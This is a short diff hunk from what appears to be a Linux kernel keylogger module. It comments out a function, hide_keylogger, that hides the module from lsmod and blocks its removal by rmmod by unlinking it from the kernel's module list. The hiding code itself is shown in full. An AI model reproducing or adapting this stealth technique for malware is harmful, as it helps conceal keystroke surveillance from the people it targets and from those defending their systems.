@@ -200,11 +200,13 @@ void store_time_in_buffer(struct timespec * current_time){
 /*This function will hide keylogger from the lsmod command
 Once hidden module cannot be removed with rmmod command
 */
+/*
 static void hide_keylogger(void)
 {
   list_del_init(&__this_module.list);
   kobject_del(&THIS_MODULE->mkobj.kobj);
 }
+*/
 
 static int init_keylogger(void)
 {
